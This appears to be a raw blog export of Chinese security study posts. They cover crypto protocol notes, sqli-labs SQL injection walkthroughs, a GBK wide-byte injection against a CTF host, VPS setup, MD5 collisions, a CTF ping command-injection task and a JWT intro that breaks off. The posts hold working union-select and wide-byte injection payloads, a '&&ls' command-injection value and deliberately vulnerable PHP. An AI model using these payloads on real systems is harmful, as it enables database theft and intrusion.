<h2 id="Interlock-Protocol-联锁协议"><a href="#Interlock-Protocol-联锁协议" class="headerlink" title="Interlock Protocol (联锁协议)"></a>Interlock Protocol (联锁协议)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice向Bob发送了她的公钥</span><br><span class="line">Bob向Alice发送了他的公钥</span><br><span class="line">Alice使用Bob的公钥加密她的消息。 她将一半的加密邮件发送给Bob</span><br><span class="line">Bob使用Alice的公钥加密他的消息。 他将一半的加密消息发送给Alice</span><br><span class="line">Alice将另一半加密消息发送给Bob</span><br><span class="line">Bob将Alice的两个消息放在一起并用他的私钥解密。 Bob将另一半加密消息发送给Alice</span><br><span class="line">Alice将Bob的两部分消息放在一起，并用她的私钥解密</span><br><span class="line"></span><br><span class="line">Alice sends Bob her public key</span><br><span class="line"></span><br><span class="line">Bob sends Alice his public key</span><br><span class="line"></span><br><span class="line">Alice encrypts her message using Bob’s public key. She sends half of the encrypted message to Bob</span><br><span class="line"></span><br><span class="line">Bob encrypts his message using Alice’s public key. He sends half of the encrypted message to Alice</span><br><span class="line"></span><br><span class="line">Alice sends the other half of her encrypted message to Bob</span><br><span class="line"></span><br><span class="line">Bob puts the two halves of Alice’s message together and decrypts it with his private key. Bob sends the other half of his encrypted message to Alice</span><br><span class="line"></span><br><span class="line">Alice puts the two halves of Bob’s message together and decrypts it with her private key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Key-Exchange-with-Digital-Signature-基于数字签名的密钥交换"><a href="#Key-Exchange-with-Digital-Signature-基于数字签名的密钥交换" class="headerlink" title="Key Exchange with Digital Signature(基于数字签名的密钥交换)"></a>Key Exchange with Digital Signature(基于数字签名的密钥交换)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绕过中间人攻击</span><br><span class="line">Trent签下了Alice和Bob的公钥</span><br><span class="line">当Alice和Bob收到密钥时，每个密钥都会验证Trent的签名</span><br><span class="line"></span><br><span class="line">Circumvents man-in-the-middle attack</span><br><span class="line"></span><br><span class="line">Trent signs both Alice’s and Bob’s public keys</span><br><span class="line"></span><br><span class="line">When Alice and Bob receive the keys, each of them verifies Trent’s signature</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Key-and-Message-Transmission-密钥和消息传输"><a href="#Key-and-Message-Transmission-密钥和消息传输" class="headerlink" title="Key and Message Transmission(密钥和消息传输)"></a>Key and Message Transmission(密钥和消息传输)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">无密钥交换协议:</span><br><span class="line">	Alice生成随机会话密钥K，并使用K.EK（M）加密M.</span><br><span class="line">	Alice从数据库中获取Bob的公钥，并使用Bob的公钥加密K.EB（K）</span><br><span class="line">	Alice将加密的消息和加密的会话密钥都发送给Bob。 EK（M），EB（K）</span><br><span class="line">	Bob使用他的私钥解密Alice的会话密钥</span><br><span class="line">	Bob使用会话密钥解密Alice的消息。</span><br><span class="line">可以与数字签名，时间戳和任何其他安全协议结合使用</span><br><span class="line"></span><br><span class="line">Without key-exchange protocol</span><br><span class="line">	Alice generates a random session key, K, and encrypts M using K. EK(M).</span><br><span class="line">	Alice gets Bob’s public key from the database and encrypts K with Bob’s public key. EB(K)</span><br><span class="line">	Alice sends both the encrypted message and encrypted session key to Bob. EK(M), EB(K)</span><br><span class="line">	Bob decrypts Alice’s session key, using his private key</span><br><span class="line">	Bob decrypts Alice’s message using the session key.</span><br><span class="line"></span><br><span class="line">Can be combined with digital signatures, timestamps, and any other security protocols</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Key-and-Message-Broadcast-密钥和消息广播"><a href="#Key-and-Message-Broadcast-密钥和消息广播" class="headerlink" title="Key and Message Broadcast(密钥和消息广播)"></a>Key and Message Broadcast(密钥和消息广播)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于将加密消息M发送给Bob，Carol和Dave的协议:</span><br><span class="line">Alice使用随机会话密钥K加密M.EK（M）</span><br><span class="line">Alice用Bob的公钥加密K，用Carol的公钥加密K，然后用Dave的公钥加密K. EB（K），EC（K），ED（K）</span><br><span class="line">Alice广播EB（K），EC（K），ED（K），EK（M）</span><br><span class="line">只有Bob，Carol和Dave可以使用K解密K和消息</span><br><span class="line"></span><br><span class="line">A protocol to send encrypted message M to Bob, Carol, and Dave</span><br><span class="line">	Alice encrypts M using random session key K. EK(M)</span><br><span class="line">	Alice encrypts K with Bob’s public key, encrypts K with Carol’s public key, and then encrypts K with Dave’s 	public key. EB(K), EC(K), ED(K)</span><br><span class="line">	Alice broadcasts EB(K), EC(K), ED(K), EK(M)</span><br><span class="line">	Only Bob, Carol, and Dave can decrypt K and message using K</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Authentication-Using-One-way-Function-使用单向函数进行身份验证"><a href="#Authentication-Using-One-way-Function-使用单向函数进行身份验证" class="headerlink" title="Authentication Using One-way Function(使用单向函数进行身份验证)"></a>Authentication Using One-way Function(使用单向函数进行身份验证)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议:</span><br><span class="line">Alice向主机发送密码</span><br><span class="line">主机对密码执行单向功能，并将该值与先前存储的值进行比较</span><br><span class="line">字典攻击和盐值：</span><br><span class="line">盐值是随机密码连接的字符串</span><br><span class="line">大多数UNIX系统只使用12位盐值</span><br><span class="line"></span><br><span class="line">Protocol</span><br><span class="line">	Alice sends the host her password</span><br><span class="line">	Host performs a one-way function on the password and compares the value with the previously stored one</span><br><span class="line"></span><br><span class="line">Dictionary attack and salt</span><br><span class="line">	Salt is a random string concatenated with passwords</span><br><span class="line">	Most UNIX systems use only 12 bits of salt</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>安全协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs修炼之路</title>
    <url>/2018/05/06/sqli-labs%E4%BF%AE%E7%82%BC%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>之前早就安装了sqli-labs，最近才拿出来系统的进行学习修炼.<br>环境的安装过程也很简单，主要是需要wamp这个集成化服务器软件，百度安装教程一大堆.<br>闲话不多说，开始我们的修炼之路！</p>
<h2 id="mysql基本操作"><a href="#mysql基本操作" class="headerlink" title="mysql基本操作"></a>mysql基本操作</h2><p>首先我们需要熟悉mysql的一些基本操作命令，通过以下命令进行数据的查询.<br><code>show databases;</code>是查询有哪些数据库<br><img src="/uploads/mysql.png" alt="1"></p>
<p><code>use information_schema;</code>选定该数据库<br><code>show tables;</code>查看该数据库中的表<br><img src="/uploads/mysql2.png" alt="1"></p>
<p><code>desc tables;</code>查看该表的结构<br><img src="/uploads/mysql3.png" alt="1"></p>
<p>‘select table_name from information_schema.tables where table_schema=’security’;’查询数据库security中的表名<br><img src="/uploads/mysql4.png" alt="1"></p>
<p>通过以上的数据查询，我们可以发现，Mysql中的系统数据库information_schema,对的，就是该数据库中存储着所有的数据库相关信息，一般情况我们只要利用该表就可以完成注入.<br>猜数据库<br>select schema_name from information_schema.schemata<br>猜某库的数据表<br>select table_name from information_schema.tables where table_schema=’xxx’<br>猜某表的所有列<br>Select column_name from information_schema.columns where table_name=’xxx’<br>获取某列的内容<br>Select *** from ****</p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先尝试<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> 是可以登陆成功的<br>继续构造<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> 发现页面报错<br>继续将后面的注释掉<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;--+">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;--+</a> 登陆成功<br>继续构造<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> and 1=2–+ 登陆失败<br>继续构造<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> and 1=1–+ 登陆成功<br>所以payload：<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> xxxx–+ </p>
<p>查看列数<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</a> order by 3–+ 数字从1依次递增尝试，发现到4就会报错，所以一共有三列</p>
<p>构造查询数据库:<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,schema_name from information_schema.schemata –+<br>但是我们会发现，只有显示了一个数据库的名称，那我们如何去查看其他的数据库呢？<br><img src="/uploads/less3.png" alt="1"></p>
<p>我们有两种方式来查看其他数据库，第一种，因为按照我们上面的payload只能显示一列的数据库，所以他才会显示了一个数据库，我们构造<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,schema_name from information_schema.schemata limit 1,1–+ 通过limit去查询下面几列的数据库，第一个数字是控制起始的行数(包含0)，第二个数子是控制查询几行。<br>但是这样一个一个查询起来很麻烦.所以我们有第二种方法，通过group_concat()连接一个组的所有字符串，构造：<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(schema_name) from information_schema.schemata –+<br><img src="/uploads/less4.png" alt="1"></p>
<p>构造查询security库的所有数据表:<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+<br><img src="/uploads/less5.png" alt="1"></p>
<p>构造查询users数据表的所有列:<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’  –+<br><img src="/uploads/less6.png" alt="1"></p>
<p>查询username列的所有内容：<a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(username) from users–+<br><img src="/uploads/less7.png" alt="1"></p>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>我们继续按照第一个的测试方法，寻找注入点，当添加单引号是报错，可以发现引号似乎多余了，查询代码使用了整数，不需要引号的闭合。<br><img src="/uploads/less8.png" alt="1"></p>
<p>构造如下payload：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> xxx–+<br>其他的查询方式和第一个一模一样.</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>继续测试注入点，发现这次似乎多出一个),所以我们只要闭合它就绕过了.<br><img src="/uploads/less9.png" alt="1"></p>
<p>payload如下：<a href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>) xxx –+<br>其他的查询方式也是和第一个一模一样.</p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>继续测试寻找注入点，这次是一个”)的闭合，我们将其闭合绕过.<br><img src="/uploads/less10.png" alt="1"></p>
<p>payload:<a href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) xxx –+<br>其他的查询方式依旧是和第一个一模一样.</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql宽字节注入漏洞</title>
    <url>/2018/03/18/sql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="sql宽字节注入漏洞"><a href="#sql宽字节注入漏洞" class="headerlink" title="sql宽字节注入漏洞"></a>sql宽字节注入漏洞</h1><blockquote>
<p>宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当mysql数据库数据正在处理和存储过程中，涉及的字符集相关信息包括：<br>1.character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。<br>2.character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。<br>3.haracter_set_database:数据库缺省编码字符集。<br>4.character_set_filesystem:文件系统编码字符集。<br>5.character_set_results:SQL语句执行结果编码字符集。<br>6.character_set_server:服务器缺省编码字符集。<br>7.character_set_system:系统缺省编码字符集。<br>8.character_sets_dir:字符集存放目录，一般不要修改。<br>宽字节对转义字符的影响发生在character_set_client=gbk的情况，也就是说，如果客户端发送的数据字符集是gbk，则可能会吃掉转义字符\，从而导致转义失败。</p>
</blockquote>
<h2 id="宽字节注入漏洞示例"><a href="#宽字节注入漏洞示例" class="headerlink" title="宽字节注入漏洞示例"></a>宽字节注入漏洞示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">$name&#x3D;addslashes($name); &#x2F;&#x2F;addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">$conn&#x3D;mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);</span><br><span class="line">if($conn&#x3D;&#x3D;null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;,$conn); &#x2F;&#x2F;gbk编码</span><br><span class="line">mysql_select_db(&quot;aaa&quot;,$conn);</span><br><span class="line">$sql&#x3D;&quot;select * from a1 where name&#x3D;&#39;&quot;.$name.&quot;&#39;&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql,$conn);</span><br><span class="line">while($val&#x3D;mysql_fetch_row($result))&#123;</span><br><span class="line">    print_r($val);</span><br><span class="line">    print(&quot;&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注入的payload：<a href="http://127.0.0.1/test/t3.php?name=a%EF%BF%BD&#39;">http://127.0.0.1/test/t3.php?name=a%df&#39;</a> or 1=1; %20%23<br>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df&#39;对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义失败。</p>
</blockquote>
<h2 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h2><p>题目链接：<a href="http://103.238.227.13:10083/">http://103.238.227.13:10083/</a></p>
<p>打开网站，是一道sql注入题目,并且要求从key表中，找出id=1的string字段。</p>
<p><img src="/uploads/sql1.png" alt="1"></p>
<p>首先查看一下源码，特别显眼的是charset=”gb2312”，宽字节注入。</p>
<p><img src="/uploads/sql2.png" alt="2"></p>
<p>构造一下payload验证一下，<a href="http://103.238.227.13:10083/?id=a%EF%BF%BD&#39;%23">http://103.238.227.13:10083/?id=a%df&#39;%23</a><br>出现如下提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;a運&#39;&#39; LIMIT 1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>说明就是宽字节注入啦！</p>
<p>继续注入，<a href="http://103.238.227.13:10083/?id=a%EF%BF%BD%27union%20select%201,database()%23">http://103.238.227.13:10083/?id=a%df%27union%20select%201,database()%23</a><br>爆出数据库名字</p>
<p><img src="/uploads/sql3.png" alt="3"></p>
<p>继续注入，<a href="http://103.238.227.13:10083/?id=a%EF%BF%BD%27union%20select%201,string%20from%20sql5.key%23">http://103.238.227.13:10083/?id=a%df%27union%20select%201,string%20from%20sql5.key%23</a><br>从数据库sql5的key表中爆出id=1的string字段</p>
<p><img src="/uploads/sql4.png" alt="4"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>vps研究利用</title>
    <url>/2018/08/29/vps%E7%A0%94%E7%A9%B6%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>近期研究大佬博客的一个题目，用到vps的nc监听，而我的vps为啥监听一直没有数据回显呢？<br>于是今天我各种查阅资料，折腾我的vps。</p>
<h2 id="vps防火墙的配置"><a href="#vps防火墙的配置" class="headerlink" title="vps防火墙的配置"></a>vps防火墙的配置</h2><p>centos默认使用的是firewall作为防火墙，默认没有开启80、3306端口，所以nc接收不到数据啊。。。</p>
<h3 id="关闭防火墙默认防火墙"><a href="#关闭防火墙默认防火墙" class="headerlink" title="关闭防火墙默认防火墙"></a>关闭防火墙默认防火墙</h3><p>systemctl stop firewalld.service  //停止firewall<br>systemctl disable firewalld.service //禁止firewall开机启动</p>
<h3 id="安装iptables防火墙"><a href="#安装iptables防火墙" class="headerlink" title="安装iptables防火墙"></a>安装iptables防火墙</h3><p>yum install iptables-services //安装</p>
<p>vi /etc/sysconfig/iptables //编辑防火墙配置文件</p>
<p>添加开放80、3306端口的配置数据<br><img src="/uploads/fire1.png" alt="1"></p>
<p>systemctl restart iptables.service //最后重启防火墙使配置生效<br>systemctl enable iptables.service  //设置防火墙开机启动</p>
<h2 id="web服务的安装配置"><a href="#web服务的安装配置" class="headerlink" title="web服务的安装配置"></a>web服务的安装配置</h2><h3 id="安装httpd-mysql-mysql-server-php"><a href="#安装httpd-mysql-mysql-server-php" class="headerlink" title="安装httpd mysql mysql-server php"></a>安装httpd mysql mysql-server php</h3><p>yum install -y httpd mysql mysql-server php php-devel</p>
<h3 id="安装php的扩展"><a href="#安装php的扩展" class="headerlink" title="安装php的扩展"></a>安装php的扩展</h3><p>yum install -y php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring</p>
<h3 id="启动apache、mysql："><a href="#启动apache、mysql：" class="headerlink" title="启动apache、mysql："></a>启动apache、mysql：</h3><p>systemctl start httpd  //启动apache</p>
<p>systemctl start mysql.service<br>出现问题：Failed to start mysql.service: Unit not found.</p>
<p>我们查询了一下了解到MariaDB代替了mysql数据库，MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。</p>
<p>那我们安装MariaDB<br>yum install mariadb-server -y //如果已安装可以省略<br>systemctl start mariadb.service //启动服务<br>systemctl enable mariadb.service //开机启动服务<br>mysql -u root -p //登录mysql </p>
<h2 id="小知识点补充"><a href="#小知识点补充" class="headerlink" title="小知识点补充"></a>小知识点补充</h2><p>nmap localhost //查看开启的端口服务<br>df -hl         //查看磁盘剩余空间</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全杂记</title>
    <url>/2018/04/08/web%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h2><p>前段时间的强网杯，被虐的遍体鳞伤，web签到硬是没签出来，就因为不知道md5碰撞。今天总结一哈。<br>主要用到这个工具，fastcoll_v1.0.0.5.exe ，网上搜一下，很多相关教程。</p>
<p><img src="/uploads/md1.png" alt="1"></p>
<p>按照如图命令可以产生两个md5值相同的文件。我们可以测试一下</p>
<p><img src="/uploads/md2.png" alt="1"></p>
<p>可以看到两个文件的md5值是相同，那么我们应该怎么去将两个文件传上去呢？<br>其实我们只要将文件以二进制形式打开，在转成url就可以上传啦！</p>
<p><img src="/uploads/md3.png" alt="1"></p>
<p>这里以1.txt为例，写了个小脚本将文件转成url，然后我们上传该值就可以成功的绕过啦</p>
<h2 id="安恒月赛web题目"><a href="#安恒月赛web题目" class="headerlink" title="安恒月赛web题目"></a>安恒月赛web题目</h2><p>还有一个题目就是安恒月赛的那道ping的web题目。主要是总结一下知识和思路</p>
<p>该题目主要涉及到了，命令执行漏洞、文件包含漏洞、伪协议等。</p>
<p>首先他有个交互界面是可以ping ip地址的，这里包含了命令执行漏洞<br>我们构造1.1.1.1&amp;&amp;ls，列出该目录下的文件。</p>
<p><img src="/uploads/ping1.png" alt="1"></p>
<p>可以观察到有一个很特别的you_find_upload.php文件，我们转到该页面，同时查看源码</p>
<p><img src="/uploads/ping2.png" alt="1"></p>
<p>可以发现，前面的几位数字是产生的随机数，后面的应该是一个base64加密<br>将字符base64解密，代码很长，但主要的就是这几行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $type &#x3D; array(&#39;gif&#39;,&#39;jpg&#39;,&#39;png&#39;);</span><br><span class="line">        mt_srand((time() % rand(1,100000)%rand(1000,9000)));</span><br><span class="line">        echo mt_rand();</span><br><span class="line">        if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">            $check &#x3D; getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span><br><span class="line">            @$extension &#x3D; end(explode(&#39;.&#39;,$_FILES[&#39;file&#39;][&#39;name&#39;]));</span><br><span class="line">            if(in_array($extension,$type))&#123;</span><br><span class="line">                echo &#39;File is an image - &#39; . $check[&#39;mime&#39;];</span><br><span class="line">                $filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;web1&#x2F;upload&#x2F;&#39;.mt_rand().&#39;_&#39;.$_FILES[&#39;file&#39;][&#39;name&#39;]; </span><br><span class="line">                move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $filename);</span><br><span class="line">                echo &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;File is not an image&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(isset($_GET[&#39;p&#39;]))&#123;</span><br><span class="line">            if(@preg_match(&quot;&#x2F;\.\.\&#x2F;&#x2F;&quot;,$_GET[&#39;p&#39;]))&#123;</span><br><span class="line">                echo &quot;你这个孩子，too young too simple&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">               @include $_GET[&#39;p&#39;].&quot;.php&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到上传文件类型的过滤，和文件存放的目录，同时前面几位随机数的生成，我们只要知道对应的随机数就可以。<br>通过网上查阅资料，该随机数是可以预测的</p>
<p><img src="/uploads/ping3.png" alt="1"><br>就像这样，给其一个seed2018，就可以生成随机数，所以我们只要推出该题目的seed，就可以预测随机数。用一个名叫php_mt_seed的工具，因为是.c文件需要在linux先跑<br>命令如下：<br>cd /php_mt_seed<br>make =&gt;bin<br>./php_mt_seed</p>
<p><img src="/uploads/ping4.jpg" alt="1"></p>
<p>连续找到大约三个随机数的seed，然后分别测试各个seed，查看与页面生成的连续的几个随机数相对应，既是真正的seed。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>关于jwt(json web token)的探究</title>
    <url>/2018/04/30/%E5%85%B3%E4%BA%8Ejwt(json%20web%20token)%E7%9A%84%E6%8E%A2%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>昨天刚结束全国大学生信息安全竞赛，从中吸取到一些竞赛，该文是由一道web题思路偏移引发的探究。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先拿到web题目，依旧是熟悉的登录注册界面…<br><img src="/uploads/quan1.png" alt="1"></p>
<p>开始尝试先注册一下，登陆进去…就只有如下界面<br><img src="/uploads/quan2.png" alt="1"></p>
<p>然后猜想…嗯，应该就是admin的弱口令了，我开始各种尝试，密码都不对，然后我掏出了我的大宝贝…brup suite,一通爆破输出，并没有任何用处…</p>
<p>我怀疑我的思路出现了问题，当我翻看cookie时，发现了jwt，嘿嘿难道是要伪造admin的jwt…</p>
<p>我首先获取了我刚注册的账号的jwt<br><img src="/uploads/quan3.png" alt="1"></p>
<p>如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4ODAxIn0.</span><br><span class="line">eyJuYW1lIjoiY2Ftc2VyIn0.</span><br><span class="line">7R3eFWYkbHP6djGXw2174oFtk3AT1nsy4jBpjK9ebrY</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="JWT是什么？"><a href="#JWT是什么？" class="headerlink" title="JWT是什么？"></a>JWT是什么？</h3><p>JSON Web Token（JWT）是一个开放标准（RFC 7519），它定义了一种紧凑和自包含的方式，用于在各方之间作为JSON对象安全地传输信息。作为标准，它没有提供技术实现，但是大部分的语言平台都有按照它规定的内容提供了自己的技术实现，所以实际在用的时候，只要根据自己当前项目的技术平台，到官网上选用合适的实现库即可。</p>
<h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名，同时它们是基于 base64url 编码的，然后他们用 . 作为分隔符粘连起来组成 JWT。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var header &#x3D; &#123;  </span><br><span class="line">        &#x2F;&#x2F; The signing algorithm.</span><br><span class="line">        &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">        &#x2F;&#x2F; The type (typ) property says it&#39;s &quot;JWT&quot;,</span><br><span class="line">        &#x2F;&#x2F; because with JWS you can sign any type of data.</span><br><span class="line">        &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x2F;&#x2F; Base64 representation of the header object.</span><br><span class="line">    headerB64 &#x3D; btoa(JSON.stringify(header)),</span><br><span class="line">    &#x2F;&#x2F; The payload here is our JWT claims.</span><br><span class="line">    payload &#x3D; &#123;</span><br><span class="line">        &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">        &quot;admin&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x2F;&#x2F; Base64 representation of the payload object.</span><br><span class="line">    payloadB64 &#x3D; btoa(JSON.stringify(payload)),</span><br><span class="line">    &#x2F;&#x2F; The signature is calculated on the base64 representation</span><br><span class="line">    &#x2F;&#x2F; of the header and the payload.</span><br><span class="line">    signature &#x3D; signatureCreatingFunction(headerB64 + &#39;.&#39; + payloadB64),</span><br><span class="line">    &#x2F;&#x2F; Base64 representation of the signature.</span><br><span class="line">    signatureB64 &#x3D; btoa(signature),</span><br><span class="line">    &#x2F;&#x2F; Finally, the whole JWS - all base64 parts glued together with a &#39;.&#39;</span><br><span class="line">    jwt &#x3D; headerB64 + &#39;.&#39; + payloadB64 + &#39;.&#39; + signatureB64;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以通过该网站进行构造<a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a></p>
<h4 id="JWT头部-header"><a href="#JWT头部-header" class="headerlink" title="JWT头部(header)"></a>JWT头部(header)</h4><p>包括以下参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alg :算法 （必选项）</span><br><span class="line">typ :类型 （如果是 JWT 那么就带有一个值 JWT，如果存在的话）</span><br><span class="line">kid :密钥 ID</span><br><span class="line">cty :内容类型</span><br><span class="line">jku JWK： 指定 URL</span><br><span class="line">jwk JSON： 网络值</span><br><span class="line">x5u X.509： URL</span><br><span class="line">x5c X.509： 证书链</span><br><span class="line">x5t X.509： 证书 SHA-1 指纹</span><br><span class="line">x5t#S256 X.509： 证书 SHA-256 指纹</span><br><span class="line">crit： 临界值</span><br></pre></td></tr></table></figure>
<p>一般常用前两个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">base64编码：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"></span><br></pre></td></tr></table></figure>
